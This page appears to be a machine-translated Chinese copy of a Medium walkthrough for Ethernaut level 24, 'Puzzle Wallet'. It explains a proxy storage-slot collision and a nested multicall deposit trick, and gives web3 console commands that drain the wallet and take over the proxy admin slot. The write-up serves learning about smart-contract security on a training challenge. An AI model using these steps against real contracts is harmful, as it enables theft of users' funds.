<html>
<head>
<title>Solving Ethernaut 24 — Puzzle Wallet</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">解决以太24-难题钱包</h1>
<blockquote>原文：<a href="https://medium.com/coinmonks/solving-ethernaut-24-puzzle-wallet-fdf3be4634c4?source=collection_archive---------19-----------------------#2022-10-27">https://medium.com/coinmonks/solving-ethernaut-24-puzzle-wallet-fdf3be4634c4?source=collection_archive---------19-----------------------#2022-10-27</a></blockquote><div><div class="ef hh hi hj hk hl"/><div class="hm hn ho hp hq"><div class=""/><figure class="fi fk ir is it iu fe ff paragraph-image"><div role="button" tabindex="0" class="iv iw di ix bf iy"><div class="fe ff iq"><img src="../Images/a8bb9cae7c75983067ad4ae61f3e90e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*rORJgNij-AuSx4Q9"/></div></div><figcaption class="jb jc fg fe ff jd je bd b be z ek">Photo by <a class="ae jf" href="https://unsplash.com/@cbpsc1?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">Clint Patterson</a> on <a class="ae jf" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">Unsplash</a></figcaption></figure><div class="jg jh fm fo ji jj"><a href="https://ethernaut.openzeppelin.com/" rel="noopener  ugc nofollow" target="_blank"><div class="jk ab ej"><div class="jl ab jm cl cj jn"><h2 class="bd hu fv z el jo eo ep jp er et hs dt translated">以太人</h2><div class="jq l"><p class="bd b gc z el jo eo ep jp er et ek translated">ethernaut.openzeppelin.com</p></div></div></div></a></div><p id="8e2b" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">在这个挑战中，我们再次面临一个利用<a class="ae jf" href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-and-libraries" rel="noopener ugc nofollow" target="_blank"> <strong class="jt hu">委派</strong> </a>的合同。这一次它被用于一种被称为<a class="ae jf" href="https://docs.soliditylang.org/en/latest/security-considerations.html#authorized-proxies" rel="noopener ugc nofollow" target="_blank"> <strong class="jt hu">的可升级代理</strong> </a> <strong class="jt hu">。</strong></p><p id="7d2b" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">可升级代理的概念是基于部署一个代理契约，它可以在任何时候升级。在这种情况下，升级意味着改变契约的逻辑。这使得开发人员能够在代码部署后更改代码，如果您需要修复合同中的bug，这是一个非常好的特性。许多dApps以这种方式使用代理来保留修复的可能性，甚至在黑客攻击和其他攻击后收回资金。然而，这也意味着开发者拥有绝对的控制权，如果他们想的话，他们可以更新他们的dApp来耗尽存放在那里的任何用户资金。所以虽然在大多数情况下…</p><p id="22f4" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">这个挑战的目标是通过将代理中的管理地址声明为自己的地址来获得对合同的控制权。</p><p id="1fae" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">代理及其实现契约的定义如下:</p><figure class="kp kq kr ks fq iu"><div class="bz el l di"><div class="kt ku l"/></div></figure><p id="7403" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">让我们从检查代理合同开始。这个契约使用了标准的OpenZeppelin代理实现，但是我们应该注意的是，这个契约还存储了两个存储变量——“pending Admin”和“admin”。“admin”变量是我们想要覆盖的变量，它被放在编号为2的<a class="ae jf" href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html" rel="noopener ugc nofollow" target="_blank"> <strong class="jt hu">存储槽</strong> </a>中。</p><blockquote class="kv kw kx"><p id="d5e8" class="jr js ky jt b ju jv jw jx jy jz ka kb kz kd ke kf la kh ki kj lb kl km kn ko hm dt translated">如果你不知道变量在存储器中是如何处理的，你可以在这里阅读。</p></blockquote><p id="b36d" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">还有一个公共函数允许我们设置“pendingAdmin”变量:</p><pre class="kp kq kr ks fq lc ld le lf aw lg dt"><span id="429c" class="lh li ht ld b fv lj lk l ll lm">function proposeNewAdmin(address _newAdmin) external {</span><span id="6576" class="lh li ht ld b fv ln lk l ll lm">   pendingAdmin = _newAdmin;</span><span id="2125" class="lh li ht ld b fv ln lk l ll lm">}</span></pre><p id="5543" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">这意味着任何人都可以在任何时候覆盖1号存储槽，我们应该注意这一点。其余的函数由“onlyAdmin”子句保护，所以我们必须在与这些函数交互之前劫持契约。</p></div><div class="ab cl lo lp hb lq" role="separator"><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt"/></div><div class="hm hn ho hp hq"><p id="b961" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">让我们来看看PuzzleWallet合同。这将是我们代理的实现契约，它包含通过函数“execute”和“multicall”存放以太网和执行任意事务的方法。不幸的是，似乎这个契约中的所有方法都受到白名单的保护，或者检查是否是契约所有者。但是因为我们知道我们的代理使用delegatecall，所以让我们看一下变量布局，看看我们是否能发现一些弱点:</p><pre class="kp kq kr ks fq lc ld le lf aw lg dt"><span id="e4a4" class="lh li ht ld b fv lj lk l ll lm">address public owner;</span><span id="971d" class="lh li ht ld b fv ln lk l ll lm">uint256 public maxBalance;</span><span id="efc6" class="lh li ht ld b fv ln lk l ll lm">mapping(address =&gt; bool) public whitelisted;</span><span id="f347" class="lh li ht ld b fv ln lk l ll lm">mapping(address =&gt; uint256) public balances;</span></pre><p id="459f" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">在存储插槽0中，我们有所有者，在存储插槽1中，我们有“最大余额”。如果您还记得我们的代理，它有一个设置“pendingAdmin”的公共方法，这个方法被放在存储槽0中。这意味着<strong class="jt hu">任何人</strong>都可以调用“proposeNewAdmin”函数，并有效地设置我们的实现契约的所有者！</p><p id="dc2c" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">让我们通过使用控制台来检查谁是当前的所有者:</p><figure class="kp kq kr ks fq iu fe ff paragraph-image"><div class="fe ff lv"><img src="../Images/53b894b0ff22728a58e2958997f7d8e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/1*i_ishFJWCimGYfj7j_dijQ.png"/></div></figure><p id="8b92" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">然后让我们尝试用我们自己的地址调用“proposeNewAdmin”函数:</p><pre class="kp kq kr ks fq lc ld le lf aw lg dt"><span id="2d15" class="lh li ht ld b fv lj lk l ll lm">await web3.eth.sendTransaction({<br/> from:(await window.ethereum.request({ method: 'eth_requestAccounts' }))[0],<br/>    to: contract.address, <br/>    data: web3.eth.abi.encodeFunctionSignature("proposeNewAdmin(address)") <br/> + web3.eth.abi.encodeParameter("address",(await window.ethereum.request({ method: 'eth_requestAccounts' }))[0]).replace('0x', '')<br/>})</span></pre><p id="1415" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">这应该建议您作为新管理员使用自己的钱包地址，所以现在让我们检查一下谁是合同的所有者:</p><figure class="kp kq kr ks fq iu fe ff paragraph-image"><div class="fe ff lw"><img src="../Images/b1174a453550bc25d1ddfc33c792cbcb.png" data-original-src="https://miro.medium.com/v2/resize:fit:492/format:webp/1*Bx6khXo8lcDAZ01ZIry6Gg.png"/></div><figcaption class="jb jc fg fe ff jd je bd b be z ek">The result should be your own wallet address now.</figcaption></figure><p id="b8b4" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">因为我们现在是所有者，它允许我们将自己列入白名单，并获得对钱包其余功能的访问权限，所以让我们这样做吧！</p><pre class="kp kq kr ks fq lc ld le lf aw lg dt"><span id="b86d" class="lh li ht ld b fv lj lk l ll lm">contract.addToWhitelist((await window.ethereum.request({ method: 'eth_requestAccounts' }))[0])</span></pre><p id="bebd" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">这很容易，但是我们的目标是榨干钱包里的钱，仅仅成为钱包的主人是不够的。我们需要更多地检查一下钱包的功能。有一个有趣的功能叫做“multicall ”,它允许白名单钱包在一次交易中进行多次呼叫。通常这是钱包中一个非常有用的功能，因为它可以让主人在复杂的交易中节省大量的汽油。但在这种情况下，有一个大问题。</p><figure class="kp kq kr ks fq iu fe ff paragraph-image"><div role="button" tabindex="0" class="iv iw di ix bf iy"><div class="fe ff lx"><img src="../Images/eecfb6122a04712eeccf1b5c0d43bd93.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZI2Hn7vwqzX_ukZiKOlz-w.png"/></div></div></figure><p id="ecd6" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">该方法为每个要调用的函数获取一个调用数据数组，然后进行迭代，直到使用delegatecall调用了所有内容。首先要注意的是，这个方法通过检查是否已经被调用来防止自己多次调用“存款”。不幸的是，它不能防止多次调用自己。这意味着您可以指定“multicall”来调用“multicall ”,因为用于跟踪存款函数的bool是在方法本身的范围内定义的，所以我们可以利用它来一次又一次地调用“存款”。</p><figure class="kp kq kr ks fq iu fe ff paragraph-image"><div role="button" tabindex="0" class="iv iw di ix bf iy"><div class="fe ff ly"><img src="../Images/d5860f940ec269c83fb4684cc5c95bf1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1256/format:webp/1*z7rlmlEo3W_pyEL7uECBhA.png"/></div></div></figure><p id="d32e" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">通过多次调用存款函数，我们可以有效地增加自己地址的钱包余额。流程如下所示:</p><p id="f648" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">“多呼叫”-&gt;“存款”-&gt;“多呼叫”-&gt;“存款”-&gt; …</p><p id="4af8" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">我们的想法是确保在呼叫“存款”之前呼叫“多呼叫”。为什么这如此糟糕？原因是delegatecall具有保存“<a class="ae jf" href="https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties" rel="noopener ugc nofollow" target="_blank"> <strong class="jt hu"> msg.sender </strong> </a>”和“<a class="ae jf" href="https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties" rel="noopener ugc nofollow" target="_blank"> <strong class="jt hu"> msg.value </strong> </a>”的特殊属性。这意味着每次我们调用“存款”函数时，我们都会保存“<a class="ae jf" href="https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties" rel="noopener ugc nofollow" target="_blank"> <strong class="jt hu"> msg.value </strong> </a>”。实际上是将这个值乘以我们重复这个过程的次数。如果我们把所有这些放在一起，它允许我们存入一小笔钱，通过利用这些钱来增加，然后我们可以提取比我们存入的更多的钱。为了在控制台中完成这一点，我们需要正确地对<a class="ae jf" href="https://docs.soliditylang.org/en/v0.8.17/abi-spec.html#abi" rel="noopener ugc nofollow" target="_blank"> <strong class="jt hu">功能和</strong> </a> <strong class="jt hu"> </strong>参数进行编码:</p><pre class="kp kq kr ks fq lc ld le lf aw lg dt"><span id="ae37" class="lh li ht ld b fv lj lk l ll lm">let depositData = web3.eth.abi.encodeFunctionCall(contract.abi[2], [] )</span><span id="ec26" class="lh li ht ld b fv ln lk l ll lm">let multicallData = web3.eth.abi.encodeFunctionCall(contract.abi[6], [[depositData]])</span><span id="c6f2" class="lh li ht ld b fv ln lk l ll lm">await web3.eth.sendTransaction({<br/> from:(await window.ethereum.request({ method: 'eth_requestAccounts' }))[0],<br/>    to: contract.address, <br/>    data: web3.eth.abi.encodeFunctionCall(contract.abi[6], [[depositData, multicallData, multicallData, multicallData, multicallData, multicallData, multicallData, multicallData, multicallData, multicallData, multicallData]]),<br/> value: await web3.eth.getBalance(contract.address) / 10 <br/>})</span></pre><p id="3512" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">在上面的示例中，我们以这样的方式对参数进行编码，即“存款”被调用11次，并且在同一交易中，我们发送整个钱包余额的1/10，这意味着我们地址的钱包余额应该等于整个钱包余额。我们可以通过比较我们的内部钱包余额和钱包的总余额来检查这一点:</p><pre class="kp kq kr ks fq lc ld le lf aw lg dt"><span id="12db" class="lh li ht ld b fv lj lk l ll lm">(await contract.balances((await window.ethereum.request({ method: 'eth_requestAccounts' }))[0])).toString() === await web3.eth.getBalance(contract.address)</span></pre><p id="e8bb" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">如果返回true，那么一切都按计划进行。现在最后一步是将钱包中的所有资金提取到我们自己的地址:</p><pre class="kp kq kr ks fq lc ld le lf aw lg dt"><span id="fdcc" class="lh li ht ld b fv lj lk l ll lm">let executeData = web3.eth.abi.encodeFunctionCall(contract.abi[3], [(await window.ethereum.request({ method: 'eth_requestAccounts' }))[0], await web3.eth.getBalance(contract.address), []] )</span><span id="4334" class="lh li ht ld b fv ln lk l ll lm">await web3.eth.sendTransaction({<br/> from:(await window.ethereum.request({ method: 'eth_requestAccounts' }))[0],<br/>    to: contract.address, <br/>    data: executeData <br/>})</span></pre><p id="4637" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">现在让我们检查一下钱包余额:</p><pre class="kp kq kr ks fq lc ld le lf aw lg dt"><span id="6fd3" class="lh li ht ld b fv lj lk l ll lm">await web3.eth.getBalance(contract.address)</span></pre><p id="575b" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">如果这返回0，那么你准备好劫持代理合同！</p><p id="d05c" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">还记得钱包契约里的变量布局吗？</p><pre class="kp kq kr ks fq lc ld le lf aw lg dt"><span id="4768" class="lh li ht ld b fv lj lk l ll lm">address public owner;</span><span id="d5f5" class="lh li ht ld b fv ln lk l ll lm">uint256 public maxBalance;</span></pre><p id="5aab" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">“maxBalance”变量位于存储槽1中，这与代理契约中的admin是同一个槽。通过设置“maxBalance”变量，我们可以将自己作为管理员插入。因为我们已经完全清空了钱包，所以我们现在可以使用我们自己的地址作为输入来调用“setMaxBalance ”:</p><pre class="kp kq kr ks fq lc ld le lf aw lg dt"><span id="5a6f" class="lh li ht ld b fv lj lk l ll lm">let callData = web3.eth.abi.encodeFunctionCall(contract.abi[8], [(await window.ethereum.request({ method: 'eth_requestAccounts' }))[0]] )</span><span id="9ccc" class="lh li ht ld b fv ln lk l ll lm">await web3.eth.sendTransaction({<br/> from:(await window.ethereum.request({ method: 'eth_requestAccounts' }))[0],<br/>    to: contract.address, <br/>    data: callData <br/>})</span></pre><p id="327b" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">您可以使用以下命令检查您确实是新的代理管理员:</p><pre class="kp kq kr ks fq lc ld le lf aw lg dt"><span id="30f4" class="lh li ht ld b fv lj lk l ll lm">await web3.eth.getStorageAt(contract.address, 1)</span></pre><p id="b5c7" class="pw-post-body-paragraph jr js ht jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko hm dt translated">别忘了提交！</p><blockquote class="lz"><p id="277f" class="ma mb ht bd mc md me mf mg mh mi ko ek translated">交易新手？试试<a class="ae jf" rel="noopener" href="/coinmonks/crypto-trading-bot-c2ffce8acb2a">加密交易机器人</a>或者<a class="ae jf" rel="noopener" href="/coinmonks/top-10-crypto-copy-trading-platforms-for-beginners-d0c37c7d698c">复制交易</a></p></blockquote></div></div>    
</body>
</html>